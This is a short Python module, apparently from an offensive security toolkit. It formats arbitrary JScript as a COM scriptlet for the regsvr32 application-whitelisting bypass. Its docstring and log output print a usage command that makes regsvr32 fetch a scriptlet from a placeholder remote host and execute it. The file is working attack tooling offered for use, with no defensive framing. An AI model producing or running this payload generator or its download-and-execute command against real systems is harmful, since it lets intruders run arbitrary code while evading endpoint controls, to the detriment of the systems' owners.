from lets.__module__ import Module


class SCT_RegSvr32(Module):
    """
    Format JScript as a COM scriptlet compatible with the RegSvr32
    application whitelisting bypass technique.

    Usage: regsvr32 /u /n /s /i:http://HOST:PORT/PAYLOAD.SCT scrobj.dll
    """

    @classmethod
    def add_arguments(cls, parser):
        pass

    def handle(self, input):
        assert input is not None, "Must provide jscript as input"

        for data in input:
            yield (self.template % data.decode()).encode()
            self.log.info("Usage: regsvr32 /u /n /s /i:http://HOST:PORT/PAYLOAD.SCT scrobj.dll")

    template = """<?XML version="1.0"?>
<scriptlet>
    <registration
        progid="Program"
        classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
        <script language="JScript">
<![CDATA[
%s
]]>
        </script>
    </registration>
</scriptlet>
"""
